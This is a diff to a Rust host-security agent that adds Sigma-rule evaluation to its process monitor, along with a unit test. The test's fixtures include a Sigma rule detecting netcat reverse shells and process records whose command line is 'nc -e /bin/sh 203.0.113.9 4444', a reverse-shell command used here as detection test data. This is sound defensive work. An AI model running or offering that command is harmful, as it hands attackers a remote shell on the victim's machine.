@@ -172,6 +172,8 @@ pub struct ProcessInfo {
 pub struct ProcessMonitor {
     /// Additional custom patterns to watch for.
     custom_patterns: HashSet<String>,
+    /// Sigma rules evaluated against every process, when any is loaded.
+    sigma: Option<super::sigma::SigmaEngine>,
 }
 
 impl ProcessMonitor {
@@ -179,7 +181,13 @@ impl ProcessMonitor {
     pub fn new() -> Self {
         Self {
             custom_patterns: HashSet::new(),
+            sigma: None,
         }
+    }
+
+    /// Evaluate these Sigma rules against every process as well.
+    pub fn set_sigma_engine(&mut self, engine: super::sigma::SigmaEngine) {
+        self.sigma = (engine.rule_count() > 0).then_some(engine);
     }
 
     /// Add a custom process pattern to watch for.
@@ -322,7 +330,7 @@ impl ProcessMonitor {
             .args([
                 "-NoProfile",
                 "-Command",
-                "Get-CimInstance Win32_Process | Select-Object ProcessId,Name,Path,CommandLine | ConvertTo-Json",
+                "Get-CimInstance Win32_Process | Select-Object ProcessId,ParentProcessId,Name,Path,CommandLine | ConvertTo-Json",
             ])
             .output()
             .map_err(|e| {
@@ -333,6 +341,8 @@ impl ProcessMonitor {
         #[serde(rename_all = "PascalCase")]
         struct WinProcess {
             process_id: u32,
+            #[serde(default)]
+            parent_process_id: Option<u32>,
             name: String,
             path: Option<String>,
             command_line: Option<String>,
@@ -355,7 +365,7 @@ impl ProcessMonitor {
                 name: p.name,
                 path: p.path,
                 cmdline: p.command_line,
-                ppid: None,
+                ppid: p.parent_process_id,
                 user: None,
             })
             .collect())
@@ -498,6 +508,36 @@ impl ProcessMonitor {
         None
     }
 
+    /// Evaluate a process that has just started: the built-in patterns, then
+    /// the Sigma rules. The agent's own process is never evaluated.
+    pub fn analyze_start(
+        &self,
+        start: &super::process_events::ProcessStart,
+    ) -> Vec<SecurityIncident> {
+        let process = &start.process;
+        if process.pid == std::process::id() {
+            return Vec::new();
+        }
+        let mut incidents: Vec<SecurityIncident> =
+            self.analyze_process(process).into_iter().collect();
+        if let Some(sigma) = &self.sigma {
+            let parent = start.parent_image.as_ref().map(|image| ProcessInfo {
+                pid: process.ppid.unwrap_or(0),
+                name: image
+                    .rsplit(['/', '\\'])
+                    .next()
+                    .unwrap_or(image)
+                    .to_string(),
+                path: Some(image.clone()),
+                cmdline: None,
+                ppid: None,
+                user: None,
+            });
+            incidents.extend(sigma_incidents_for(sigma, process, parent.as_ref()));
+        }
+        incidents
+    }
+
     /// Scan all running processes for suspicious activity.
     pub async fn scan_processes(&self) -> ScannerResult<(Vec<SecurityIncident>, u32)> {
         let processes = self.get_processes()?;
@@ -512,6 +552,10 @@ impl ProcessMonitor {
             "Scanning {} processes (excluding own PID {})",
             count, my_pid
         );
+
+        if let Some(sigma) = &self.sigma {
+            incidents.extend(sigma_incidents(sigma, &processes, my_pid));
+        }
 
         for proc in processes {
             if proc.pid == my_pid {
@@ -530,6 +574,79 @@ impl ProcessMonitor {
     }
 }
 
+/// Incidents for the processes matching Sigma rules. The agent's own process
+/// is never evaluated.
+fn sigma_incidents(
+    engine: &super::sigma::SigmaEngine,
+    processes: &[ProcessInfo],
+    own_pid: u32,
+) -> Vec<SecurityIncident> {
+    let by_pid: std::collections::HashMap<u32, &ProcessInfo> =
+        processes.iter().map(|p| (p.pid, p)).collect();
+    processes
+        .iter()
+        .filter(|process| process.pid != own_pid)
+        .flat_map(|process| {
+            let parent = process.ppid.and_then(|ppid| by_pid.get(&ppid).copied());
+            sigma_incidents_for(engine, process, parent)
+        })
+        .collect()
+}
+
+/// Incidents for one process matching Sigma rules.
+fn sigma_incidents_for(
+    engine: &super::sigma::SigmaEngine,
+    process: &ProcessInfo,
+    parent: Option<&ProcessInfo>,
+) -> Vec<SecurityIncident> {
+    use super::sigma::{SigmaLevel, process_event};
+    use super::{IncidentSeverity, IncidentType};
+
+    let event = process_event(process, parent);
+    engine
+        .evaluate(&event)
+        .into_iter()
+        .map(|rule| {
+            let (severity, confidence) = match rule.level {
+                SigmaLevel::Critical => (IncidentSeverity::Critical, 90),
+                SigmaLevel::High => (IncidentSeverity::High, 80),
+                SigmaLevel::Medium => (IncidentSeverity::Medium, 60),
+                SigmaLevel::Low => (IncidentSeverity::Low, 40),
+                SigmaLevel::Informational => (IncidentSeverity::Low, 20),
+            };
+            warn!(
+                "Sigma rule '{}' matched process {} (PID: {})",
+                rule.title, process.name, process.pid
+            );
+            let description = if rule.description.is_empty() {
+                format!("Sigma rule \"{}\" matched this process.", rule.title)
+            } else {
+                rule.description.clone()
+            };
+            SecurityIncident::new(
+                IncidentType::SuspiciousProcess,
+                severity,
+                format!("Sigma: {}", rule.title),
+                description,
+            )
+            .with_confidence(confidence)
+            .with_evidence(serde_json::json!({
+                "detection": "sigma",
+                "rule_id": rule.id,
+                "rule_title": rule.title,
+                "attack_techniques": rule.attack_techniques(),
+                "process_name": process.name,
+                "pid": process.pid,
+                "path": process.path.clone().or_else(|| process.cmdline.clone()),
+                "cmdline": process.cmdline,
+                "ppid": process.ppid,
+                "parent_image": parent.map(|p| p.path.clone().unwrap_or_else(|| p.name.clone())),
+                "user": process.user,
+            }))
+        })
+        .collect()
+}
+
 impl Default for ProcessMonitor {
     fn default() -> Self {
         Self::new()
@@ -539,6 +656,90 @@ impl Default for ProcessMonitor {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn sigma_matches_become_process_incidents_with_their_parent() {
+        use crate::security::sigma::{SigmaEngine, parse_rule};
+        let rule = parse_rule(
+            "title: Netcat Reverse Shell\nid: test-rule-1\ndescription: Netcat started with -e.\n\
+             level: critical\ntags:\n  - attack.t1059.004\nlogsource:\n  category: process_creation\n\
+             detection:\n  sel:\n    Image|endswith: '/nc'\n    CommandLine|contains: ' -e '\n    \
+             ParentImage|endswith: '/sshd'\n  condition: sel\n",
+        )
+        .unwrap();
+        let engine = SigmaEngine::with_rules(vec![rule]);
+        let process = |pid: u32, ppid: u32, path: &str, cmdline: &str| ProcessInfo {
+            pid,
+            name: path.rsplit('/').next().unwrap_or(path).to_string(),
+            path: Some(path.to_string()),
+            cmdline: Some(cmdline.to_string()),
+            ppid: Some(ppid),
+            user: Some("alice".to_string()),
+        };
+        let processes = vec![
+            process(100, 1, "/usr/sbin/sshd", "sshd: alice"),
+            process(200, 100, "/usr/bin/nc", "nc -e /bin/sh 203.0.113.9 4444"),
+            // Same command, but not started from sshd.
+            process(300, 1, "/usr/bin/nc", "nc -e /bin/sh 203.0.113.9 4444"),
+            // Would match, but it is the agent itself.
+            process(400, 100, "/usr/bin/nc", "nc -e /bin/sh 203.0.113.9 4444"),
+        ];
+
+        let incidents = sigma_incidents(&engine, &processes, 400);
+        assert_eq!(incidents.len(), 1);
+        let incident = &incidents[0];
+        assert_eq!(
+            incident.incident_type,
+            crate::security::IncidentType::SuspiciousProcess
+        );
+        assert_eq!(
+            incident.severity,
+            crate::security::IncidentSeverity::Critical
+        );
+        assert_eq!(incident.title, "Sigma: Netcat Reverse Shell");
+        assert_eq!(incident.description, "Netcat started with -e.");
+        assert_eq!(incident.confidence, 90);
+        assert_eq!(incident.evidence["pid"], 200);
+        assert_eq!(incident.evidence["process_name"], "nc");
+        assert_eq!(incident.evidence["parent_image"], "/usr/sbin/sshd");
+        assert_eq!(incident.evidence["rule_id"], "test-rule-1");
+        assert_eq!(incident.evidence["attack_techniques"][0], "T1059.004");
+
+        // The same rule applies to a process reported as it starts, with the
+        // parent image the event carries.
+        let rule = parse_rule(
+            "title: Netcat Reverse Shell\nlogsource:\n  category: process_creation\n\
+             detection:\n  sel:\n    Image|endswith: '/nc'\n    ParentImage|endswith: '/sshd'\n  condition: sel\n",
+        )
+        .unwrap();
+        let mut monitor = ProcessMonitor::new();
+        monitor.set_sigma_engine(SigmaEngine::with_rules(vec![rule]));
+        let start =
+            |pid: u32, parent: Option<&str>| crate::security::process_events::ProcessStart {
+                process: process(pid, 100, "/usr/bin/nc", "nc 203.0.113.9 4444"),
+                parent_image: parent.map(str::to_string),
+            };
+        let incidents = monitor.analyze_start(&start(200, Some("/usr/sbin/sshd")));
+        assert_eq!(incidents.len(), 1);
+        assert_eq!(incidents[0].evidence["parent_image"], "/usr/sbin/sshd");
+        assert!(
+            monitor
+                .analyze_start(&start(200, Some("/bin/zsh")))
+                .is_empty()
+        );
+        assert!(monitor.analyze_start(&start(200, None)).is_empty());
+        assert!(
+            monitor
+                .analyze_start(&start(std::process::id(), Some("/usr/sbin/sshd")))
+                .is_empty(),
+            "the agent never evaluates itself"
+        );
+
+        // An engine without rules is not kept.
+        let mut monitor = ProcessMonitor::new();
+        monitor.set_sigma_engine(SigmaEngine::default());
+        assert!(monitor.sigma.is_none());
+    }
 
     #[test]
     fn test_process_monitor_creation() {
